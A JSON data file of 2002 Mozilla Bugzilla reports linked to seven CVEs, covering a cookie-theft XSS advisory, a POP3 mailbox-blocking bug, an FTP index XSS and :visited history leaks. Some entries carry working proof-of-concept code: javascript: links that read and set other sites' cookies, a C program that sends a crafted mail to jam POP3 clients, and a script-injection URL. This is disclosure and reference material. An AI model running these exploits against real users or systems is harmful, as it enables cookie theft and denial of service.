{
  "year": 2002,
  "total": 7,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2002-2260": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=179329",
        "title": "HTML-unsafe characters need to be escaped in quips",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021108 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021108 Somebody included <i> in a quip on this page so the second half of the page is italicized. Reproducible: Always Steps to Reproduce: 1. Look at the sample page code/rendering. Actual Results: The bracket characters are not escaped. Expected Results: The bracket characters need to be escaped. This is a potential security issue since somebody could add some unauthorized javascript. I am making this critical for that reason."
      }
    ],
    "CVE-2002-2314": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=152725",
        "title": "Possible cookie stealing using javascript: URLs",
        "description": "Title: Mozilla 1.0 XSS - Reading/setting arbitrary cookie Date: [2002-06-19] Software: Mozilla 1.0 Impact: At least reading/setting arbitrary cookie Vendor: http://www.mozilla.org _ _ Workaround: Disable javascript o' \\,=./ `o Author: Andreas Sandblad, sandblad@acc.umu.se (o o) ---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo--- DESCRIPTION: ============ Mozilla allows script in the javascript protocoll to set and read cookies. The operating host and path is determined in similiar way as for http urls, namely as \"javascript:[host][path]\". Cookie security is based only on host and path. By carefully crafting a mallicious javascript link opened in a new window, it is possible to access and alter cookies from other domains. EXPLOIT: ======== Setting a host not generating any javascript errors may seem difficult but can easily be done using some tricks. It is done by fooling Mozilla into thinking the host is a legal variable. Using the fact that dots in javascript represents a way to access members in objects, we can create a complete valid host not generating any javascript errors. Setting a legal \"/\" path is done by understanding that \"host/ 1\" is ok as long as the host variable is an integer. The number \"1\" will not be included in the path because there is a space between \"/\" and \"1\". NOTE: Exploit is designed for default settings in Mozilla and has been tested on win32 (3 machines) and freeBSD (1 machine). On win32 the timer can be set to 0, but on freeBSD it has to be set to something like 50 ms. The timer is set to 2000 ms just in case. -------------------------- CUT HERE ---------------------------- <pre> Title: Mozilla 1.0 XSS Exploit Date: [2002-06-19] _ _ Impact: Reading/setting arbitrary cookie o' \\,=./ `o Author: Andreas Sandblad, sandblad@acc.umu.se (o o) ---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo--- </pre> <a href=\"javascript:readCookie();\">Read google cookie (must be set)</a><br> <a href=\"javascript:setCookie();\">Set www.mozilla.org cookie</a> <script> function readCookie() { s = \"javascript:function f(){com=1} google=new f();\" + \"location='javascript:google.com/1;\" + \"setTimeout(\\\"alert(document.cookie);close()\\\",2000);\\\"\\\"'\"; open(s); } function setCookie() { s = \"javascript:function f(){org=1} function g(){mozilla=f} \" + \"www=new g();www.mozilla=new f();\" + \"location='javascript:www.mozilla.org/1;\" + \"setTimeout(\\\"document.cookie=\\\\'YOUARE=VULNERABLE;\" + \"path=/;expires=Fri, 13 Dec 2003 23:59:59 GMT;\\\\';\" + \"alert(\\\\'cookie set\\\\');close()\\\",2000);\\\"\\\"'\"; open(s); } </script> -------------------------- CUT HERE ---------------------------- Disclaimer: =========== Andreas Sandblad is not responsible for the misuse of the information provided in this advisory. The opinions expressed are my own and not of any company. In no event shall the author be liable for any damages whatsoever arising out of or in connection with the use or spread of this advisory. Any use of the information is at the user's own risk. Old advisories: =============== #7 [2002-05-19] \"IE dot bug\" http://online.securityfocus.com/archive/1/273168 #6 [2002-05-15] \"Opera javascript protocoll vulnerability\" http://online.securityfocus.com/archive/1/272583 #5 [2002-04-26] \"Mp3 file can execute code in Winamp.\" http://online.securityfocus.com/archive/1/269724 #4 [2002-04-15] \"Using the backbutton in IE is dangerous.\" http://online.securityfocus.com/archive/1/267561 CREDITS: ======== (for helping me testing the vulnerability) Ingesson (freeBSD), Quitta (win32), Hawkan (win32) Feedback: ========= Please send suggestions and comments to: _ _ sandblad@acc.umu.se o' \\,=./ `o (o o) ---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo--- Andreas Sandblad, student in Engineering Physics at Umea University, Sweden. -/---/---/---/---/---/---/---/---/---/---/---/---/---/---/---/--"
      }
    ],
    "CVE-2002-2338": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=144228",
        "title": "Malicious email breaks POP server connection",
        "description": "Hi, I have found a bug is mozilla, involving the retreiving part of it, it can block the retreiving of the mail box, and the only way is to use telnet to delete the bad mail or, using others mailclient. the blocking effect is due to mishandling of \\r\\n, for more information use the C code that I have join in the bottom of this mail. I have wrote all the info in this little text, I will not distribute this text until the bug gets fix, and when it will, the code will be corrupt to not let some \"script kiddies\" plays at DoSing anyone... Apart from this, Mozilla is great! :] //////////////////////////////////////////// ///// Strange Software Behaviour Reports #1 of eldre8@afturgurluk.org /// //// discovered, understood and exploited between 05, 08 2001 //// (yes, i took the time... :) ) \\/\\/\\_/-> System affected: All versions of Netscape All versions of Mozilla (even the 2002041711) ^\\/\\/'\\-> System not affected: Outlook Express Outlook 2000 IncrediMail(thks to ben81 for testing) |_/\\/\\\\/> Buggy software team contacted about this: in process... /\\/\\/\\_/> Exploitation: remote & very easy & very anonymous :( _/\\/\\/\\_> Effects: With this remote hole, we can block any mail box that is checked with a pop3 client, so the hotmail, caramail like servers are not affected. A mail will cause the pop3 client to desynchronize with the server, losing the connection to it, and so, leaves all messages on the server (explain later)... In Netscape, we could only see the header of the message, in Mozilla, we could see the begin of the mail message... -/\\/\\/\\/> Explanation: In the SMTP protocol, we can send mail with some introduction command (ehlo,mail,rcpt) and then type our messages and place a dot at a new line to specify to the MTA that it is the end of the message. On the other side, when a POP3 client check mail, it connect to the server, retreive the mail, it terminate the download of a message when it sees a dot at a new line. And here is the trick. If we can place a dot at a new line, and place other words below this dot, the client will beleive the mail is finished and will try to download next messages, thus beiing desynchronize with the server... The POP3 client act as: login on to the POP3 server retrieve mails delete mails logout but if it is desynchronize, it will retreive mail, and disconnect, thus didn't delete mails, and the next time it login, it will refind the same mail, will retreive one more time the mails, disconnect, and other and other... A more detailed explanation, here it is a simple end of a normal mail: blabla... \\x0a \\x0a and this is the bad mail: blabla... \\x0a\\x0d\\x2e\\x0d\\x20\\x0a\\x0a\\x0a blabla... \\x0a\\x20\\x00 \\x0a We can see at the end of the two 0x0a, it seems that it is just place here by the console...forget it. At this stage, you could catch the bug... Bad implementation of \\r\\n ? =\\/\\/\\/-> Possible fixes: There are different ways to fix this, - one way is from the client, to stop the bad mail, this is to connect manually via telnet to the pop3 server, and then identify the bad message and do a dele <# of the message> - one better way is to fix this from the client itself, the client can get the size of each messages via the list command, so it should be able to retrieve the complete message, not less, not more... - one way is to fix the MTA so it will not accept such the code below... ~\\/\\/\\/~> Exploit: /* this is the code that comes with my * advisory #1 to illustrate this... * eldre8@afturgurluk.org */ #include <stdio.h> #include <strings.h> #include <sys/types.h> #include <sys/socket.h> #include <netdb.h> #include <netinet/in.h> #include <unistd.h> #include <signal.h> #define MX \"localhost\" #define EHLO \"EHLO mx\\r\\n\" #define MAIL \"MAIL FROM: root@localhost\\r\\n\" #define RCPT \"RCPT TO: root@localhost\\r\\n\" #define DATA \"DATA\\r\\n\" #define QUIT \"QUIT\\r\\n\" #define PORT 25 int sock; char buffer[255]; void SigCatch() { fprintf(stderr,\"\\b\\bbye!\\n\"); close(sock); free(buffer); exit(0); } int main() { /* I was too lame to implement the command line... :) */ int i; struct sockaddr_in sout; struct hostent *hp; signal(SIGINT,SigCatch); hp=gethostbyname(MX); sock=socket(AF_INET,SOCK_STREAM,0); if (sock<0) { perror(\"sock\"); return -1; } sout.sin_family=AF_INET; sout.sin_port=htons(PORT); memcpy(&(sout.sin_addr),*(hp->h_addr_list),sizeof(struct in_addr)); if (connect(sock,&sout,sizeof(sout))<0) { perror(\"connect\"); return -1; } recv(sock,buffer,255,MSG_OOB); /* receive the banner... */ fprintf(stderr,buffer); send(sock,EHLO,sizeof(EHLO),MSG_OOB); recv(sock,buffer,255,MSG_OOB); /* receive the welcome message... */ fprintf(stderr,buffer); send(sock,MAIL,sizeof(MAIL),MSG_OOB); recv(sock,buffer,255,MSG_OOB); /* receive the acknowledgement to mail from. */ fprintf(stderr,buffer); send(sock,RCPT,sizeof(RCPT),MSG_OOB); recv(sock,buffer,255,MSG_OOB); /* idem, but for the rcpt to... */ fprintf(stderr,buffer); send(sock,DATA,sizeof(DATA),MSG_OOB); recv(sock,buffer,255,0); fprintf(stderr,buffer); i=sprintf(buffer,\"b4d maIl 1n 4KT1oN!\\n\\x0a\\x0d\\x2e\\x0d\\x20\\x0a\\x0a\\nblabla...\\x0a\\x20\"); *(buffer+i)=\"\\x0\"; sprintf(buffer+i+1,\"\\n.\\n\"); send(sock,buffer,i+1+3,0); /* send the dumb thing ... */ recv(sock,buffer,255,MSG_OOB); fprintf(stderr,buffer); send(sock,QUIT,sizeof(QUIT),MSG_OOB); recv(sock,buffer,255,MSG_OOB); fprintf(stderr,buffer); close(sock); return 0; }"
      }
    ],
    "CVE-2002-2359": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=154030",
        "title": "HTML directory indexer doesn't html-escape url",
        "description": "As reported by ptrs-ejy@bp.iij4u.or.jp to the security group, the uri (which is added to the page) isn't html escaped: <quote> + Exploit code: ~~~~~~~~~~~~~~~~~ <a href=\"ftp://'FTPserver' or 'FTP+HTTPserver'/#%3C%2ftitle%3E%3Cscript%3Ealert(%22exploit%22);%3C%2fscript%3E\">Exploit</a> </quote> (You need to add a valid ftp server in there) Patch coming"
      }
    ],
    "CVE-2002-2435": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=147777",
        "title": ":visited support allows queries into global history",
        "description": "We should have a pref for :visited support, since there are some things that can be determined about the user's history (and perhaps used for other exploits if one knows they use one-click amazon purchasing, or a certain bank, etc.) using :visited rules. (These include using GetComputedStyle or using generated content or 'display: none' to cause server hits. The latter could be fixed with a parallel style context tree (in limited cases), which could allow the pref to disable rules only in author-level stylesheets, but that's quite a bit of work.)"
      }
    ],
    "CVE-2002-2436": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=147777",
        "title": ":visited support allows queries into global history",
        "description": "We should have a pref for :visited support, since there are some things that can be determined about the user's history (and perhaps used for other exploits if one knows they use one-click amazon purchasing, or a certain bank, etc.) using :visited rules. (These include using GetComputedStyle or using generated content or 'display: none' to cause server hits. The latter could be fixed with a parallel style context tree (in limited cases), which could allow the pref to disable rules only in author-level stylesheets, but that's quite a bit of work.)"
      }
    ],
    "CVE-2002-2437": [
      {
        "url": "http://bugzilla.mozilla.org/show_bug.cgi?id=147777",
        "title": ":visited support allows queries into global history",
        "description": "We should have a pref for :visited support, since there are some things that can be determined about the user's history (and perhaps used for other exploits if one knows they use one-click amazon purchasing, or a certain bank, etc.) using :visited rules. (These include using GetComputedStyle or using generated content or 'display: none' to cause server hits. The latter could be fixed with a parallel style context tree (in limited cases), which could allow the pref to disable rules only in author-level stylesheets, but that's quite a bit of work.)"
      }
    ]
  }
}
